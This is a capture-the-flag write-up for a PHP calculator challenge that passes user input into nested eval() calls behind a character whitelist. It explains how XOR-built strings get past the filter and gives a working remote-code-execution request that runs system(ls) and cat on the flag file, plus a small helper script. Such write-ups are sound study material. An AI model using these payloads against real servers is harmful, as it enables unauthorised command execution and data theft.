### Code: 

```php
<?php

ini_set("display_errors", 0);

if(!isset($_GET["calc"])) 
{
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
    }
    echo 'Result: ';
    eval("echo ".eval("return ".$_GET["calc"].";").";");
}

```

# Explanation: #
In above code only parameter is "calc". If parameter is not passed then source code is shown otherwise parameter is processed.
## Constraints
There are some constraints on roll parameter:-
### 1. Length
Length should be less than 70 characters.
### 2. Allowed Characters
0-9, +, -, *, /, (, ), ', ., ~, ^, |, &

## Target
Flag is in same directory in file "fl4g1sH3re.php".
1. We need to list all files in directory
2. We need to read flag file

## Exploitation:
#### Final Request
```http://139.180.155.171/?calc=(%2778***%26^^^^^1^%2b%27^%27|~~~~~2333-|-|%27^%27.058||3*(9(|.~%27)&1=system(ls);```

### Explanation

Here, request has two get parameters

#### 1. Payload parameter
```1=system(ls);```

this parameter is delivering command to be executed. When we will know name of file we can read using

```1=system('cat fl4g1sH3re.php');```

#### 2. Execution parameter

calc parameter is evaluated on runtime using eval. So I am delivering ```calc = eval($_GET[1])```.

So whatever is delivered in Get parameter 1, it will be executed on runtime.

How delivered without alphabets?

if we use xor like '^' ^ '2', it will becomes 'l'. Here '^' and '2' are characters. You can see there ascii value in ascii table. And there xor is resulting a character 'l'.

So How created whole payload?

First you should know one important property of xor

if, a^b=c

then a^c =b and b^a=c

Means if we have two values, we can find third. So if I xor character I am trying to create with characters I have, it will tell other character needed. It took very long time to find all correct combination. It is not automation or something but I used this python script for finding xor's

```python
chars = '0123456789+-*/().~^|&'
search = ")"
print("character ", search)

for c in chars:
	x = chr(ord(c)^ord(search))
	print(c, "=>" x)

```

